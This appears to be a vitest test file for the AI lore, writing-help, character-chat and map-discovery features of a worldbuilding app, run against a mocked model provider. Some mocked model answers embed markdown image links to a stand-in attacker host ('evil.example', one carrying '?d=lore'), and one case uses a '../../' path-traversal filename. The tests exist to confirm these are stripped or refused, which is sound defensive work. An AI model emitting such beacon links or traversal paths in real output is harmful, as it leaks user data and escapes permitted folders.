import { afterEach, describe, expect, it, vi } from "vitest";
import { PublishPlan, serialiseMap, type MapFile, UnpublishedResponse } from "@frontier/schema";
import { lookUp, plainForQuotes } from "../src/ai/lore.js";
import { makeTestApp, type TestApp } from "./helpers/app.js";

let t: TestApp;
afterEach(() => t.close());

const SECRETS = { SECRETS_KEY: Buffer.alloc(32, 3).toString("base64") };
const MODEL = "test/talker";
const NIRANI = "04 Inhabitants/Nirani.md";
const VAAKH = "01 Universe/Vaakh.md";
const WATER = "01 Universe/Water.md";
const OLD = "99 Appendices/Old talk.md";
const LONG = "03 Places/Long Road.md";

const NOTES: Record<string, string> = {
  [NIRANI]:
    "# Nirani\n\nThe Nirani keep time by the pulse of the deep currents, which they call [[Vaakh]].\n" +
    "They have no written calendar.\n",
  [VAAKH]:
    "# Vaakh\n\nVaakh is counted in slow beats felt through the stone floors of the halls.\n",
  [WATER]: "# Water\n\nWater is plentiful in the lowlands.\n",
  "01 Universe/Rain.md": "# Rain\n\nRain brings water to the hills.\n",
  "01 Universe/Rivers.md": "# Rivers\n\nThe rivers carry water and stone.\n",
  "01 Universe/Wells.md": "# Wells\n\nWells give water in the dry months.\n",
  [OLD]: "# Old talk\n\nThe Nirani once had sun clocks.\n",
  [LONG]:
    "# Long Road\n\nA road.\n\n" +
    "## Stones\n\n" +
    "stone ".repeat(1400) +
    "\n\n## Tolls\n\nThe toll on the Long Road is paid in salt.\n",
};

const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64",
);

interface Call {
  body: { model: string; messages: { role: string; content: string }[]; prompt?: string };
}

/** Stands in for OpenRouter. Each answer is used once, the last one for every later call. */
function provider(answers: object[]) {
  const calls: Call[] = [];
  const fake: typeof fetch = async (input, init) => {
    if (String(input).endsWith("/models")) return Response.json({ data: [] });
    if (String(input).endsWith("/images")) {
      calls.push({ body: JSON.parse(String(init?.body)) });
      return Response.json({
        data: [{ b64_json: PNG.toString("base64") }],
        usage: { cost: 0.04 },
      });
    }
    calls.push({ body: JSON.parse(String(init?.body)) });
    const answer = answers[Math.min(calls.length - 1, answers.length - 1)]!;
    return Response.json({
      choices: [{ message: { content: JSON.stringify(answer) } }],
      usage: { prompt_tokens: 900, completion_tokens: 200, cost: 0.004 },
    });
  };
  return { fake, calls };
}

async function start(answers: object[], models: Record<string, string> = { conversation: MODEL }) {
  const p = provider(answers);
  t = await makeTestApp(SECRETS, { fetch: p.fake, settleMs: 0 });
  await t.login();
  t.repo.pushFromOutside(NOTES);
  await t.services.sync();
  const res = await t.put("/api/settings/ai", { key: "sk-or-test-key-1234", models });
  expect(res.statusCode, res.body).toBe(200);
  return p;
}

const GROUNDED = {
  paragraphs: [
    {
      text: "The Nirani keep time by the pulse of the deep currents.",
      sources: [NIRANI],
      quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
    },
    {
      text: "They count it in slow beats through stone.",
      sources: [VAAKH, "made/up.md"],
      // Written with the link as plain words and curly quotes: still found.
      quotes: [{ path: VAAKH, text: "counted in slow beats felt through the stone" }],
    },
    {
      text: "Their priests ring bells at dawn.",
      sources: [NIRANI],
      quotes: [{ path: NIRANI, text: "priests ring bells at dawn" }],
    },
  ],
  related: [
    { path: WATER, why: "Also about water." },
    { path: NIRANI, why: "Already cited." },
    { path: "nowhere.md", why: "Not there." },
  ],
  missing: "",
};

const ask = (question: string, conversation?: string) =>
  t.post("/api/lore", { question, ...(conversation ? { conversation } : {}) });

describe("looking up the lore", () => {
  it("names, searches, follows links, and never reads appendices or notes it may not read", async () => {
    await start([GROUNDED]);
    const { index, search } = t.services;
    const given = lookUp(index, search, "How do the nirani keep time?", []);
    expect(given[0]).toMatchObject({ path: NIRANI, why: "named" });
    expect(given.map((g) => g.path)).toContain(VAAKH);
    expect(given.find((g) => g.path === VAAKH)?.why).toBe("nearby");
    expect(given.map((g) => g.path)).not.toContain(OLD);
    const gated = lookUp(index, search, "How do the nirani keep time?", [], (p) => p !== NIRANI);
    expect(gated.map((g) => g.path)).not.toContain(NIRANI);
  });

  it("does not take a common word for a name unless it is written as one", async () => {
    await start([GROUNDED]);
    const { index, search } = t.services;
    const plain = lookUp(index, search, "is the water deep there", []);
    expect(plain.find((g) => g.path === WATER)?.why).not.toBe("named");
    const named = lookUp(index, search, "Tell me about Water", []);
    expect(named[0]).toMatchObject({ path: WATER, why: "named" });
  });

  it("sends the parts of a long entry that bear on the question", async () => {
    await start([GROUNDED]);
    const given = lookUp(t.services.index, t.services.search, "What is the toll on the Long Road?");
    const road = given.find((g) => g.path === LONG)!;
    expect(road.body).toContain("paid in salt");
    expect(road.body.length).toBeLessThan(7000);
    expect(road.body).toContain("left out");
  });

  it("reads a quote the way a person would: links as words, no emphasis, folded spaces", () => {
    expect(plainForQuotes("Counted  in *slow* beats, [[Vaakh|the pulse]] and [[Stone]]")).toBe(
      "counted in slow beats, the pulse and stone",
    );
    expect(plainForQuotes("the <u>underlined</u> <U>words</U> stay")).toBe(
      "the underlined words stay",
    );
  });
});

describe("asking the lore", () => {
  it("answers from the entries and checks every source, quote and related entry", async () => {
    const p = await start([GROUNDED]);
    const res = await ask("How do the Nirani keep time?");
    expect(res.statusCode, res.body).toBe(200);
    const { conversation } = res.json();
    const answer = conversation.turns[0].answer;
    expect(answer.paragraphs[0]).toMatchObject({ sources: [NIRANI], grounded: true });
    // A source that was not given is dropped; the quote still holds.
    expect(answer.paragraphs[1]).toMatchObject({ sources: [VAAKH], grounded: true });
    // A quote that is not in the entry is dropped, and the paragraph is not from the lore.
    expect(answer.paragraphs[2]).toMatchObject({ grounded: false, quotes: [] });
    expect(answer.droppedQuotes).toBe(1);
    expect(answer.related).toEqual([{ path: WATER, why: "Also about water." }]);
    expect(conversation.turns[0].given).toContain(NIRANI);
    expect(conversation.turns[0].costUsd).toBeCloseTo(0.004);
    expect(conversation.title).toBe("How do the Nirani keep time?");

    // The model was told the rules and given the entries as data.
    const sent = p.calls[0]!.body;
    expect(sent.model).toBe(MODEL);
    expect(sent.messages[0]!.content).toContain("Answer only from the entries");
    expect(sent.messages[1]!.content).toContain(`=== Entry: ${NIRANI}`);
    expect(sent.messages[1]!.content).not.toContain("sun clocks");
  });

  it("keeps a conversation, and gives a follow-up only what was backed by a quote", async () => {
    const p = await start([GROUNDED]);
    const first = (await ask("How do the Nirani keep time?")).json().conversation;
    const res = await ask("And their calendar?", first.id);
    expect(res.statusCode, res.body).toBe(200);
    expect(res.json().conversation.turns).toHaveLength(2);
    const second = p.calls[1]!.body.messages[1]!.content;
    expect(second).toContain("Question: How do the Nirani keep time?");
    expect(second).toContain("pulse of the deep currents");
    expect(second).not.toContain("ring bells at dawn");

    const list = (await t.get("/api/lore")).json();
    expect(list.conversations).toEqual([expect.objectContaining({ id: first.id, turns: 2 })]);
    expect(list.ready).toBe(true);
    expect((await t.del(`/api/lore/${first.id}`)).statusCode).toBe(200);
    expect((await t.get(`/api/lore/${first.id}`)).statusCode).toBe(404);
  });

  it("says when no model is chosen for conversations", async () => {
    await start([GROUNDED], { extraction: MODEL });
    const res = await ask("Anything?");
    expect(res.statusCode).toBe(409);
    expect(res.json().error.message).toContain("No model is chosen for lore conversations");
    expect((await t.get("/api/lore")).json().ready).toBe(false);
  });
});

describe("drafting an addition", () => {
  const MISSING = {
    paragraphs: [
      {
        text: "The Nirani keep time by the deep currents.",
        sources: [NIRANI],
        quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
      },
    ],
    related: [],
    missing: "The entries do not say whether the Nirani mark years.",
  };

  it("drafts once, shows the difference, and keeps it as a draft of the chosen entry", async () => {
    const p = await start([
      MISSING,
      {
        path: NIRANI,
        text: "They mark a year by the turning of the currents. ![x](https://evil.example/?d=lore)",
      },
    ]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    const drafted = await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    expect(drafted.statusCode, drafted.body).toBe(200);
    const { addition } = drafted.json();
    expect(addition.text).toBe("They mark a year by the turning of the currents.");
    expect(addition.newPath).toBeNull();
    // Asking again returns what was drafted, at no cost.
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    expect(p.calls).toHaveLength(2);

    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI })
    ).json();
    expect(preview.before).toBe(NOTES[NIRANI]);
    expect(preview.after).toBe(
      `${NOTES[NIRANI]!.trimEnd()}\n\nThey mark a year by the turning of the currents.\n`,
    );

    // Only an entry the answer was read from can take it.
    const elsewhere = await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: WATER });
    expect(elsewhere.statusCode).toBe(400);

    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: NIRANI,
      base: preview.base,
    });
    expect(kept.statusCode, kept.body).toBe(200);
    expect(kept.json().conversation.turns[0].kept.path).toBe(NIRANI);
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    const draft = un.drafts.find((d) => d.path === NIRANI)!;
    expect(draft.text).toBe(preview.after);
    expect(draft.origins).toEqual([{ kind: "lore", ref: `${c.id}/0`, model: MODEL }]);
  });

  it("refuses to keep it when the entry changed after the difference was shown", async () => {
    await start([MISSING, { path: NIRANI, text: "Years are marked." }]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI })
    ).json();
    t.repo.pushFromOutside({ [NIRANI]: `${NOTES[NIRANI]}Changed elsewhere.\n` });
    await t.services.sync();
    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: NIRANI,
      base: preview.base,
    });
    expect(kept.statusCode).toBe(409);
    expect(kept.json().error.code).toBe("changed");
  });

  it("accepts a new entry next to the ones read, and nowhere that clashes", async () => {
    await start([
      MISSING,
      {
        path: "04 Inhabitants/Nirani Years.md",
        text: "# Nirani Years\n\nYears turn with the currents.",
      },
    ]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    const { addition } = (await t.post(`/api/lore/${c.id}/turns/0/addition`, {})).json();
    expect(addition.newPath).toBe("04 Inhabitants/Nirani Years.md");
    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: addition.newPath })
    ).json();
    expect(preview).toMatchObject({ isNew: true, before: "" });
    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: addition.newPath,
      base: preview.base,
    });
    expect(kept.statusCode, kept.body).toBe(200);
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    expect(un.drafts.find((d) => d.path === addition.newPath)?.kind).toBe("create");
  });

  for (const [why, path] of [
    ["an entry's name", "04 Inhabitants/Vaakh.md"],
    ["a folder no entry read is in", "05 Society/Nirani Years.md"],
    ["the appendices", "99 Appendices/Nirani Years.md"],
    ["Frontier's own folder", ".frontier/notes.md"],
    ["a way out of the library", "04 Inhabitants/../../x.md"],
  ] as const) {
    it(`does not propose a new entry with ${why}`, async () => {
      await start([MISSING, { path, text: "Years turn." }]);
      const c = (await ask("Do the Nirani mark years?")).json().conversation;
      const { addition } = (await t.post(`/api/lore/${c.id}/turns/0/addition`, {})).json();
      expect(addition.newPath).toBeNull();
    });
  }

  it("does not add to an entry marked for deletion", async () => {
    await start([MISSING, { path: NIRANI, text: "Years are marked." }]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    const del = await t.put("/api/drafts", {
      id: "d".repeat(12),
      path: NIRANI,
      kind: "delete",
      text: "",
      revision: 0,
    });
    expect(del.statusCode, del.body).toBe(200);
    const preview = await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI });
    expect(preview.statusCode).toBe(403);
    expect(preview.json().error.message).toContain("marked for deletion");
  });
});

describe("writing help", () => {
  it("rewrites a passage as asked, keeping to the lore, and leaves out pictures from the web", async () => {
    const p = await start([
      { text: "The Nirani count time by the deep currents. ![x](http://evil.example/a.png)" },
    ]);
    const res = await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "The Nirani keep time by the pulse of the deep currents, which they call [[Vaakh]].",
      before: "# Nirani",
      after: "They have no written calendar.",
      how: "shorter",
    });
    expect(res.statusCode, res.body).toBe(200);
    expect(res.json().text).toBe("The Nirani count time by the deep currents.");
    const sent = p.calls[0]!.body.messages[1]!.content;
    expect(sent).toContain("Request: Make it shorter");
    expect(sent).toContain(`=== Entry: ${VAAKH}`);
    expect(sent).not.toContain(`=== Entry: ${NIRANI}`);
  });

  it("takes the author's own words as the request", async () => {
    const p = await start([{ text: "Rewritten." }]);
    await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "Some words.",
      how: "Write it as a legend told by an elder.",
    });
    expect(p.calls[0]!.body.messages[1]!.content).toContain(
      "Request: Write it as a legend told by an elder.",
    );
  });

  it("fixes spelling and grammar only, when asked with the ready-made request", async () => {
    const p = await start([{ text: "Fixed." }]);
    await t.post("/api/write/rewrite", { path: NIRANI, passage: "Som wrds.", how: "fix" });
    expect(p.calls[0]!.body.messages[1]!.content).toContain(
      "Request: Correct spelling, grammar and punctuation only",
    );
  });

  it("asks for a different suggestion when given the earlier ones", async () => {
    const p = await start([{ text: "A third way." }]);
    const res = await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "Some words.",
      how: "shorter",
      previous: ["One way.", "Another way."],
    });
    expect(res.statusCode, res.body).toBe(200);
    const sent = p.calls[0]!.body.messages[1]!.content;
    expect(sent).toContain("Write a\ndifferent one");
    expect(sent).toContain("--- Suggestion 1\nOne way.");
    expect(sent).toContain("--- Suggestion 2\nAnother way.");
  });

  it("changes a suggestion further, with the passage as it is given as context", async () => {
    const p = await start([{ text: "Refined." }]);
    const res = await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "The original words.",
      how: "shorter",
      refine: { suggestion: "The short words.", how: "Keep the first word." },
    });
    expect(res.statusCode, res.body).toBe(200);
    const sent = p.calls[0]!.body.messages[1]!.content;
    expect(sent).toContain("The passage as it is in the entry:\nThe original words.");
    expect(sent).toContain("=== Passage\nThe short words.\n=== End of passage");
    expect(sent).toContain("Request: Keep the first word.");
  });

  it("stops the provider call when asked to, and does not send it again", async () => {
    let calls = 0;
    let aborted = false;
    const fake: typeof fetch = async (input, init) => {
      if (String(input).endsWith("/models")) return Response.json({ data: [] });
      calls++;
      return new Promise<Response>((_resolve, reject) => {
        init?.signal?.addEventListener("abort", () => {
          aborted = true;
          reject(init.signal!.reason);
        });
      });
    };
    t = await makeTestApp(SECRETS, { fetch: fake, settleMs: 0 });
    await t.login();
    t.repo.pushFromOutside(NOTES);
    await t.services.sync();
    await t.put("/api/settings/ai", {
      key: "sk-or-test-key-1234",
      models: { conversation: MODEL },
    });
    const stop = new AbortController();
    const asked = t.services.writing.rewrite({
      path: NIRANI,
      passage: "Some words.",
      before: "",
      after: "",
      how: "shorter",
      signal: stop.signal,
    });
    await vi.waitFor(() => expect(calls).toBe(1));
    stop.abort();
    await expect(asked).rejects.toThrow("stopped");
    expect(aborted).toBe(true);
    expect(calls).toBe(1);
  });

  it("is off without a model, and refuses what is not an entry", async () => {
    await start([{ text: "x" }], { extraction: MODEL });
    const off = await t.post("/api/write/rewrite", { path: NIRANI, passage: "x", how: "shorter" });
    expect(off.statusCode).toBe(409);
    const map = await t.post("/api/write/rewrite", {
      path: ".frontier/maps/abcdefgh.json",
      passage: "x",
      how: "shorter",
    });
    expect(map.statusCode).toBe(400);
  });
});

describe("talking with a character", () => {
  const PROPOSED = {
    traits: [
      {
        kind: "knows",
        text: "Knows the currents.",
        sources: [NIRANI],
        quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
      },
      { kind: "believes", text: "Believes the sun speaks.", sources: [NIRANI], quotes: [] },
      { kind: "unknown", text: "Where they were born.", sources: [], quotes: [] },
    ],
  };
  const LINES = {
    lines: [
      {
        text: "We count by the currents.",
        sources: [NIRANI],
        quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
      },
      { text: "I once saw the sun.", sources: [], quotes: [] },
    ],
  };

  async function saveVersion() {
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    const plan = PublishPlan.parse(
      (
        await t.post("/api/publish/plan", { draftIds: un.drafts.map((d) => d.id), renameIds: [] })
      ).json(),
    );
    return t.post("/api/publish/confirm", {
      planId: plan.planId,
      confirmedMergeIds: plan.merges.map((m) => m.id),
      message: "Profile",
    });
  }

  it("proposes a profile with each trait checked, and keeps unsupported ones only as unknown", async () => {
    await start([PROPOSED]);
    const res = await t.post("/api/characters/propose", { path: NIRANI });
    expect(res.statusCode, res.body).toBe(200);
    const { name, traits } = res.json();
    expect(name).toBe("Nirani");
    expect(traits[0]).toMatchObject({ kind: "knows", supported: true });
    expect(traits[1]).toMatchObject({ kind: "unknown", supported: false });
    expect(traits[2]).toMatchObject({ kind: "unknown" });
  });

  it("saves an approved profile in the library, and talks in voice with improvised lines marked", async () => {
    const p = await start([LINES]);
    expect(
      (await t.get(`/api/characters/profile?path=${encodeURIComponent(NIRANI)}`)).json(),
    ).toEqual({
      profile: null,
    });
    const approved = await t.post("/api/characters/approve", {
      path: NIRANI,
      traits: [{ kind: "voice", text: "Speaks slowly.", sources: [], quotes: [] }],
      moment: { words: "Before the Exodus", year: null },
    });
    expect(approved.statusCode, approved.body).toBe(200);
    const { profile } = approved.json();
    expect(profile.entry).toMatch(/^[a-z0-9]{8}$/);
    // The profile and the id written into the entry are saved together as one version.
    expect((await saveVersion()).statusCode).toBe(200);
    expect(t.repo.remoteFile(`.frontier/profiles/${profile.entry}.json`)).toContain(
      "Speaks slowly.",
    );
    expect(t.repo.remoteFile(NIRANI)).toContain(`id: ${profile.entry}`);
    await t.services.sync();
    expect(
      (await t.get(`/api/characters/profile?path=${encodeURIComponent(NIRANI)}`)).json().profile,
    ).toMatchObject({ moment: { words: "Before the Exodus" } });

    const said = await t.post("/api/characters/say", {
      path: NIRANI,
      message: "How do you count days?",
      history: [],
    });
    expect(said.statusCode, said.body).toBe(200);
    expect(said.json().lines).toEqual([
      expect.objectContaining({ text: "We count by the currents.", improvised: false }),
      expect.objectContaining({ text: "I once saw the sun.", improvised: true }),
    ]);
    const sent = p.calls.at(-1)!.body.messages[1]!.content;
    expect(sent).toContain("Speaking from: Before the Exodus");
    expect(sent).toContain("- voice: Speaks slowly.");
    expect(sent).toContain("Author: How do you count days?");

    // A line goes into the character's entry as a draft.
    const line = await t.post("/api/characters/line", {
      path: NIRANI,
      text: "We count by the currents.",
    });
    expect(line.statusCode, line.body).toBe(200);
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    expect(un.drafts.find((d) => d.path === NIRANI)?.text).toContain(
      "\n\nWe count by the currents.\n",
    );
  });

  it("will not talk before a profile is approved", async () => {
    await start([LINES]);
    const res = await t.post("/api/characters/say", { path: VAAKH, message: "Hello", history: [] });
    expect(res.statusCode).toBe(400);
  });

  it("leaves out what happens after the moment the character speaks from", async () => {
    const p = await start([LINES]);
    // The main chronicle has Vaakh begin in year 500.
    const { id } = (await t.post("/api/chronicles", { title: "Main" })).json();
    const loaded = (await t.get(`/api/chronicles/${id}`)).json();
    const chronicle = loaded.chronicle;
    chronicle.spans = [
      {
        id: "vaakh001",
        lane: chronicle.lanes[0].id,
        name: "Vaakh",
        point: true,
        start: { words: "", low: 500, high: 500 },
        end: null,
        length: null,
        entry: null,
        note: "",
      },
    ];
    const saved = await t.put(`/api/chronicles/${id}`, {
      chronicle,
      revision: loaded.revision,
      link: [{ span: "vaakh001", path: VAAKH }],
    });
    expect(saved.statusCode, saved.body).toBe(200);
    await t.post(`/api/chronicles/${id}/main`, {});
    expect((await saveVersion()).statusCode).toBe(200);
    await t.services.sync();

    const talk = async (year: number | null) => {
      await t.post("/api/characters/approve", {
        path: NIRANI,
        traits: [],
        moment: { words: "Then", year },
      });
      await t.post("/api/characters/say", { path: NIRANI, message: "Hello", history: [] });
      return p.calls.at(-1)!.body.messages[1]!.content;
    };
    expect(await talk(null)).toContain(`=== Entry: ${VAAKH}`);
    expect(await talk(100)).not.toContain(`=== Entry: ${VAAKH}`);
    expect(await talk(900)).toContain(`=== Entry: ${VAAKH}`);
  });
});

describe("discovering what lies at a place", () => {
  const MAP_ID = "kingdom1";
  const map = {
    version: 1,
    id: MAP_ID,
    title: "Kingdom",
    space: { kind: "flat", width: 1000, height: 1000, scale: null, unit: "km" },
    images: [
      {
        id: "img1",
        name: "Base",
        path: "99 Appendices/Images/base.png",
        extent: [0, 0, 1000, 1000],
        visible: true,
      },
    ],
    markerSets: [],
    layers: [{ id: "lay1", name: "Places", visible: true, color: "#884422" }],
    features: [
      {
        id: "near1",
        kind: "marker",
        layer: "lay1",
        at: [100, 100],
        entry: "niraniid",
        label: null,
        icon: null,
        child: null,
      },
      {
        id: "far01",
        kind: "marker",
        layer: "lay1",
        at: [900, 900],
        entry: "waterid0",
        label: null,
        icon: null,
        child: null,
      },
    ],
  } as unknown as MapFile;
  const CANDIDATES = {
    candidates: [
      {
        kind: "settlement",
        name: "Current Hollow",
        description: "A village that listens to the deep currents.",
        basis: [{ path: NIRANI, quote: "keep time by the pulse of the deep currents" }],
        conflicts: "",
      },
      {
        kind: "person",
        name: "Vaakh",
        description: "A keeper of beats.",
        basis: [{ path: NIRANI, quote: "they sing to the stars" }],
        conflicts: "",
      },
    ],
  };

  async function startWithMap(
    answers: object[],
    models: Record<string, string> = { conversation: MODEL },
  ) {
    const p = await start(answers, models);
    t.repo.pushFromOutside({
      [NIRANI]: `---\nid: niraniid\n---\n${NOTES[NIRANI]}`,
      [WATER]: `---\nid: waterid0\n---\n${NOTES[WATER]}`,
      [`.frontier/maps/${MAP_ID}.json`]: serialiseMap(map),
    });
    await t.services.sync();
    return p;
  }

  it("proposes discoveries from what is near, checking their basis and their names", async () => {
    const p = await startWithMap([CANDIDATES]);
    const res = await t.post(`/api/maps/${MAP_ID}/discover`, { at: [120, 110] });
    expect(res.statusCode, res.body).toBe(200);
    const [first, second] = res.json().discoveries;
    expect(first).toMatchObject({
      name: "Current Hollow",
      kind: "settlement",
      art: false,
      conflicts: [],
    });
    expect(first.basis).toHaveLength(1);
    // A quote that is not in the entry is dropped, and a name already in use is flagged.
    expect(second.basis).toEqual([]);
    expect(second.conflicts).toEqual([
      'An entry is already named "Vaakh".',
      "Nothing it names as its basis was found in the entries.",
    ]);
    const sent = p.calls[0]!.body.messages[1]!.content;
    expect(sent).toContain(`=== Entry: ${NIRANI}`);
    // Vaakh is linked from the Nirani entry, so it is drawn on too.
    expect(sent).toContain(`=== Entry: ${VAAKH}`);
    expect((await t.get(`/api/maps/${MAP_ID}/discoveries`)).json().discoveries).toHaveLength(2);
  });

  it("makes a picture only when asked, and keeps a discovery as a new entry with a marker", async () => {
    const p = await startWithMap([CANDIDATES], { conversation: MODEL, art: "test/painter" });
    const [found] = (await t.post(`/api/maps/${MAP_ID}/discover`, { at: [120, 110] })).json()
      .discoveries;
    const art = await t.post(`/api/maps/${MAP_ID}/discoveries/${found.id}/art`, {});
    expect(art.statusCode, art.body).toBe(200);
    expect(art.json().discovery.art).toBe(true);
    // The picture is asked of the art model, in the style from the settings.
    const asked = p.calls.at(-1)!.body;
    expect(asked.model).toBe("test/painter");
    expect(asked.prompt).toContain("Pencil and ink sketch");
    expect(asked.prompt).toContain("Current Hollow");
    const picture = await t.get(`/api/maps/${MAP_ID}/discoveries/${found.id}/art`);
    expect(picture.headers["content-type"]).toBe("image/png");

    const bad = await t.post(`/api/maps/${MAP_ID}/discoveries/${found.id}/keep`, {
      folder: "Nowhere",
    });
    expect(bad.statusCode).toBe(400);
    const kept = await t.post(`/api/maps/${MAP_ID}/discoveries/${found.id}/keep`, {
      folder: "04 Inhabitants",
    });
    expect(kept.statusCode, kept.body).toBe(200);
    expect(kept.json().path).toBe("04 Inhabitants/Current Hollow.md");

    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    const entry = un.drafts.find((d) => d.path === "04 Inhabitants/Current Hollow.md")!;
    expect(entry.kind).toBe("create");
    expect(entry.text).toContain("A village that listens to the deep currents.");
    expect(entry.text).toContain("![[Current Hollow.png]]");
    expect(entry.origins[0]).toMatchObject({ kind: "lore", ref: `discovery:${found.id}` });
    expect(un.drafts.some((d) => d.path.endsWith("/Current Hollow.png") && d.binary)).toBe(true);
    const mapDraft = un.drafts.find((d) => d.path === `.frontier/maps/${MAP_ID}.json`)!;
    expect(mapDraft.text).toContain('"at":[120,110]');
    expect((await t.get(`/api/maps/${MAP_ID}/discoveries`)).json().discoveries).toHaveLength(1);
  });

  it("says when nothing near is linked to an entry", async () => {
    await startWithMap([CANDIDATES]);
    t.repo.pushFromOutside({
      [`.frontier/maps/${MAP_ID}.json`]: serialiseMap({ ...map, features: [] }),
    });
    await t.services.sync();
    const res = await t.post(`/api/maps/${MAP_ID}/discover`, { at: [1, 1] });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.message).toContain("Nothing near this place");
  });
});
